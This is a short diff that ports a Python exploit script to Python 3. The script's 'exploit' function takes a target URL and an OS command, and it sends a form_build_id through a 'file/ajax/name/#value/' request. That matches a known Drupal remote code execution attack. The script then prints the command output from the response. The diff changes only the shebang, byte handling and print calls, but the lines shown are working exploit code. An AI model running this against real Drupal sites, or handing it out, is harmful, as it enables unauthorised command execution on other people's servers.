@@ -1,7 +1,5 @@
-#!/usr/bin/python
+#!/usr/bin/python3
 # coding: utf-8
-
-
 
 import requests
 import re
@@ -22,9 +20,10 @@ def exploit(url_target,os_command):
         parametros = {'q':'file/ajax/name/#value/' + found}
         datos = {'form_build_id':found}
         r = requests.post(url_target, data=datos, params=parametros)
+        
         r.encoding = 'ISO-8859-1'
-        salida = r.content.split("[{")
-        print salida[0]
+        salida = r.content.split(b"[{")
+        print(salida[0].decode('ISO-8859-1'))
 
 def usage():
     comm = os.path.basename(sys.argv[0])
